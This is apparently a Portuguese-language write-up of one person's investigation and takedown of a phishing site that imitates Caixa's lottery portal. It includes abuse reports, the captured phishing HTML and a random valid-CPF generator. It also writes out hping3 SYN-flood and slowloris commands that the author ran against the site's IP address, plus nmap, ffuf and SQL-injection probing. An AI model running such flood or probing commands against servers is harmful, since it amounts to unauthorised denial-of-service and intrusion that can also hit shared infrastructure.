# PreventingWebfraud
An event that required investigation!

Comportamento observado: O site copiava o site de bolão da caixa, copiando principalmente o formulário inicial, solicitando CPF; após solicitar o CPF ele confirmava o nome da pessoa e após isso ela já entrava direto na parte de seleção do bolão e posteriormente para a parte de pagamento.

Identifiquei um site tentando se passar por um site de sorteios da caixa (Phishing) (site do governo):
```
https://megadavirada-oficial.online/pv/?utm_medium=paid&utm_source=FB-1766942878672-twc8lbptzbj3e&utm_id=120242417040220608&utm_content=120242417041000608&utm_term=120242417040870608&utm_campaign=120242417040220608&fbclid=PAb21jcAO-SB9leHRuA2FlbQEwAGFkaWQBqy_Xl49iIHNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp9CPmSvaae0FbQYwg7nZ_o6R2LJqH4cYb1OGuNCOMJH3rN8ny9LMxW4JZaOe_aem_-MNgKxzsvPFzTvpxT2aZjQ&twrclid=695168cab9ee0c17dd04a8a3
```

<br>
Ao acessar o site básico (sem o restante dos caracteres(https://megadavirada-oficial.online)) recebo esta mensagem, identificando realmente que o site é um esquema de phishing(mal configurado, já que consigo acessar o index):
<img width="1429" height="533" alt="Screenshot 2025-12-28 135705" src="https://github.com/user-attachments/assets/42b34e8b-b6f6-4564-8676-15cdddfbc8ec" />
<br>

# Primeiro passo: Reportar a informação ao google em https://safebrowsing.google.com/safebrowsing/report_phish/?authuser=1:
<img width="1417" height="760" alt="image" src="https://github.com/user-attachments/assets/987b5d48-58d4-408b-8b5f-d5dd04564e93" />

# Segundo passo: Buscar informações no whois:
<img width="737" height="836" alt="Screenshot 2025-12-29 011936" src="https://github.com/user-attachments/assets/9893ab21-5c26-4317-934e-b377a9fd3bd6" /><br>
Parece que o site foi criado recentemente, dia 25 de dezembro, justamente onde a mega da virada é mais procurada!
<br>
Usei o burp suite para verificação dos requests do site e encontrei a informação que precisava, a hospedagem ocorria no hostiger!
Então vamos reportar essas informações para a ferramenta de hospedagem em : 
https://www.hostinger.com/br/denunciar-abuso <br>
Formulário utilizado <br>
<img width="691" height="867" alt="image" src="https://github.com/user-attachments/assets/223f786a-8365-4062-bc96-96b46725a339" />


# Terceiro passo: Entrar em contato com a Empresa processadora do pagamento:
Utilizei um script de criação de vários CPF's randômicos, já que o site abria com a mesmo formulário de login da caixa solicitando o CPF, precisei criar alguns aleatórios já que uma validação rigorosa via API era realizada sobre os CPF's, vou deixar o código do programa em python mais abaixo em detalhes técnicos. Após conseguir utilizar um CPF válido aleatório entrei no site, selecionei um bolão e fui para a parte de pagamentos e identifiquei no código da página de pagamento o link de outra api e realizei contato com a equipe para desabilitarem a api utilizada no scam!

API Encontrada no site: apiUrl\":\"https://api.conta.pagou.ai/v1\"}},\"credit\":null,\"billet\":null}}]}]\n"])

E-mail enviado para a Pagou.ai:
Assunto: Denúncia de Fraude/Phishing - Cliente utilizando API Pagou.ai

Corpo: Identificamos que a conta associada ao domínio megadavirada-oficial.online está utilizando a API da Pagou.ai (https://api.conta.pagou.ai/v1) para processar pagamentos fraudulentos.

O site em questão simula a interface oficial das Loterias Caixa (Mega da Virada) para enganar usuários. 
Evidência de Checkout: https://seguro.megadavirada-oficial.online/checkout/Z-28WAF127ZU25 
Evidência de Integração: Encontrada chamada de API para o endpoint de vocês no código-fonte do checkout.

Solicito o bloqueio imediato das chaves de API e o congelamento dos fundos desta conta para evitar danos a terceiros e conformidade com as normas do Banco Central (Resolução BCB nº 103).
<br>
<img width="388" height="594" alt="image" src="https://github.com/user-attachments/assets/009800da-bb0d-4ab0-93c7-afe7770af31d" />

# Resultado Final:
Por fim a Hostinger realizou o bloqueio do site no dia 29/12 por volta das 1 hora da manhã.<br>
<img width="1599" height="244" alt="image" src="https://github.com/user-attachments/assets/43d3bf68-d31a-481d-b97a-5a6983d79a14" />



# Detalhes mais técnicos:

O request que foi analisado indicou várias coisas!

1. Consulta de CPF Real: O script consulta.php indica que os golpistas estão usando uma API (provavelmente paga ou de dados vazados) para buscar o nome real da vítima a partir do CPF. Isso serve para dar credibilidade ao golpe: "Se o site sabe meu nome completo, deve ser oficial".
2. Rastreamento (Tracking): Eles estão usando ferramentas de marketing digital para monitorar quem clica no golpe:
utmify.com.br: Usado para rastrear a origem do tráfego (se veio de um anúncio no Facebook ou Google).
pixelId: Um pixel de rastreamento para otimizar os anúncios deles e encontrar mais vítimas parecidas com o seu pai.
3. Hospedagem: O header Platform: hostinger e Panel: hpanel confirma que eles estão usando a Hostinger. Esta é uma informação crucial.

O que mais poderia ser explorado:
Como o site está usando o aaPanel, existem algumas frentes teóricas de exploração que pentseters analisam nesses casos:

1. Identificação de Painéis e Portas
O aaPanel geralmente roda em portas específicas (como 8888, 8848, ou 7800). Você pode usar o Nmap no seu Kali para ver se o painel de administração está exposto: nmap -sV -p 80,443,8888,7800 45.61.157.104
2. Enumeração de Diretórios (Fuzzing)
Embora a página inicial seja a padrão, os arquivos do golpe podem estar escondidos em pastas. Você pode usar o FFUF ou o Gobuster no Kali para tentar encontrar o caminho real do golpe: ffuf -u http://45.61.157.104/FUZZ -w /usr/share/wordlists/dirb/common.txt Se você encontrar algo como /caixa/, /login/ ou /pix/, saberá onde o golpe está escondido.
3. Exploração do LiteSpeed
O header Alt-Svc: h3=":443" mostra que ele suporta HTTP/3 (QUIC). Para estudos avançados, você poderia pesquisar vulnerabilidades específicas de versões antigas do LiteSpeed ou do protocolo QUIC.


REQUEST EM QUESTÃO:
```
HTTP/2 200 OK

Content-Type: text/html

Last-Modified: Sun, 28 Dec 2025 07:57:14 GMT

Etag: "3203-6950e2da-227fa263fcd0c0f5;br"

Accept-Ranges: bytes

Vary: Accept-Encoding

Content-Length: 12803

Date: Sun, 28 Dec 2025 17:30:37 GMT

Server: LiteSpeed

Platform: hostinger

Panel: hpanel

Content-Security-Policy: upgrade-insecure-requests

Alt-Svc: h3=":443"; ma=2592000, h3-29=":443"; ma=2592000, h3-Q050=":443"; ma=2592000, h3-Q046=":443"; ma=2592000, h3-Q043=":443"; ma=2592000, quic=":443"; ma=2592000; v="43,46"



<!DOCTYPE html>

<html lang="pt-br">

<head>

    <meta charset="utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Loterias Online</title>

    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">

    <link rel="preconnect" href="https://fonts.googleapis.com">

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">

    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">



    <script 

        src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"

        data-token="8b50ea00-6b9c-4b4e-9a2e-9d498614beed"

        data-click-id-param="click_id">

    </script>




<script

  src="../../../cdn.utmify.com.br/scripts/utms/latest.js"

  data-utmify-prevent-xcod-sck

  data-utmify-prevent-subids

  async

  defer

></script>

<script>

  window.pixelId = "6950e1ed81ca4e02547dc7c4";

  var a = document.createElement("script");

  a.setAttribute("async", "");

  a.setAttribute("defer", "");

  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");

  document.head.appendChild(a);

</script>

    <style>

        @font-face {

            font-family: 'Futura-Book';

            src: url('fonts/Futura-Book.eot');

            src: url('fonts/Futura-Book.eot#iefix') format('embedded-opentype'),

                url('fonts/Futura-Book.woff2') format('woff2'),

                url('fonts/Futura-Book.woff') format('woff'),

                url('fonts/Futura-Book.ttf') format('truetype'),

                url('images/Futura-Book.svg#Futura-Book') format('svg');

            font-weight: normal;

            font-style: normal;

            font-display: swap;

        }



        body {

            font-family: 'Futura-Book' !important;

        }



        #CSS OCULTADO PARA FINS DE MENOR POLUIÇÃO.



<body>

    <div class="container-bg">

        <div class="container-principal d-flex justify-content-center align-items-center flex-column">

            <!-- usando URL direta da logo oficial da Caixa -->

            <img src="./images/logo-caixa.webp" alt="Logo Caixa">

            <h1>Login Caixa</h1>

            <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>

            <form id="cpfForm">

                <div class="form-group">

                    <label for="cpf" style="top: 11%;">CPF</label>

                    <input name="cpf" id="cpf" type="text" onkeyup="formatCpf(this)" maxlength="14">

                    <button class="botoes" type="submit">Próximo</button>

                </div>

            </form>



            <h3>É novo por aqui? <a href="">Cadastre-se</a></h3>

            <h3><a href="">Preciso de ajuda</a></h3>

        </div>

    </div>



    <script>

        function formatCpf(input) {

            let value = input.value.replace(/\D/g, '');

            if (value.length > 3) value = value.replace(/^(\d{3})(\d)/, '$1.$2');

            if (value.length > 6) value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');

            if (value.length > 9) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');

            input.value = value;

        }



        document.getElementById('cpfForm').addEventListener('submit', async function (event) {

            event.preventDefault();



            const cpfInput = document.getElementById('cpf');

            const cpf = cpfInput.value.replace(/\D/g, '');

            const button = this.querySelector('button[type="submit"]');



            button.disabled = true;

            button.textContent = 'Consultando...';

            button.style.opacity = '0.5';



            console.log('[v0] Iniciando consulta CPF:', cpf);



            try {

                if (cpf.length !== 11) {

                    throw new Error('Por favor, digite um CPF válido.');

                }



                const response = await fetch('consulta.php', {

                    method: 'POST',

                    headers: {

                        'Content-Type': 'application/x-www-form-urlencoded',

                    },

                    body: `cpf=${cpf}`

                });



                console.log('[v0] Resposta HTTP:', response.status);



                const data = await response.json();

                console.log('[v0] Dados recebidos:', data);



                if (data.status === 200 && data.dados && data.dados.length > 0) {

                    const dadosApi = data.dados[0];

                    

                    const dadosUsuario = {

                        nome: dadosApi.NOME || '',

                        mae: dadosApi.MAE || '',

                        sexo: dadosApi.SEXO || '',

                        nascimento: dadosApi.NASCIMENTO || '',

                        cpf: cpf

                    };

                    localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));



                    console.log('[v0] Dados salvos no localStorage:', dadosUsuario);



                    const container = document.querySelector('.container-bg');

                    container.innerHTML = `

                    <div class="container-principal2 d-flex justify-content-center align-items-center flex-column">

                        <img src="./images/logo-caixa.webp" alt="Logo Caixa">

                        <h1>Login Caixa</h1>

                        <h2>Para continuar, confirme se o seu nome está correto.</h2>

                        <h2>Nome:</h2>

                        <form>

                            <input type="radio" checked>

                            <label>${dadosApi.NOME}</label><br>

                        </form>

                        <div class="botoes2 w-100 d-flex flex-column justify-content-center align-items-center">

                            <a href="/c/4.html"><button>Sim, sou eu</button></a>

                            <a href="/pv"><button class="btn-nao">Quero alterar meus dados</button></a>

                        </div>

                        <h3><a href="">Preciso de ajuda</a></h3>

                    </div>

                    `;

                } else {

                    throw new Error(data.error || 'CPF não encontrado.');

                }

            } catch (error) {

                console.error('[v0] Erro na consulta:', error);

                alert(error.message || 'CPF inválido. Por favor, tente novamente.');

            } finally {

                button.disabled = false;

                button.textContent = 'Próximo';

                button.style.opacity = '1';

            }

        });



        document.addEventListener('DOMContentLoaded', function () {

            const input = document.getElementById('cpf');

            const label = input.previousElementSibling;



            function moveLabel() {

                if (input.value.trim() !== '') {

                    label.style.top = '-15px';

                } else {

                    label.style.top = '11%';

                }

            }



            input.addEventListener('focus', function () {

                label.style.top = '-15px';

            });



            input.addEventListener('blur', moveLabel);

            input.addEventListener('input', moveLabel);

            moveLabel();

        });

    </script>



    <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>

</body>

</html>
```

Após isso fui buscar mais informações do site, realizei alguns testes de PING com HPING e SlowHTTPTest e o site caiu temporariamente, retornando posteriormente! Entendi que possui tecnologias para que continue funcionando mesmo sob pressão. 

Utilizei:
sudo hping3 -S --flood -V -p 80 45.61.157.104
e
slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://45.61.157.104 -x 24 -p 3
<br>
Site down:<br>
<img width="700" height="404" alt="Screenshot 2025-12-28 140531" src="https://github.com/user-attachments/assets/b53eaf2d-4d34-4f97-93d0-f408ff2943fc" />
<br>

Após isso utilizei o Burp suite e realizei alguns testes com SQL injection, mas nenhum deles com sucesso!
<img width="1595" height="878" alt="Screenshot 2025-12-28 145320" src="https://github.com/user-attachments/assets/16af063f-26a7-44ed-93f6-6ded157e231c" />

Após isso parti para o esgotamento de recursos da API, já que identifiquei no site que uma api pública era utilizada.

Código usado para criação de CPF'S aleatórios:
```
def gera_cpf():
    import random
    n = [random.randrange(10) for i in range(9)]
    # Cálculo do primeiro dígito
    s = sum(x * y for x, y in zip(n, range(10, 1, -1)))
    d1 = 11 - s % 11
    if d1 >= 10: d1 = 0
    n.append(d1)
    # Cálculo do segundo dígito
    s = sum(x * y for x, y in zip(n, range(11, 1, -1)))
    d2 = 11 - s % 11
    if d2 >= 10: d2 = 0
    n.append(d2)
    return "".join(map(str, n))

#Gera 100 CPFs válidos para teste
    for _ in range(100):
    print(gera_cpf())
```

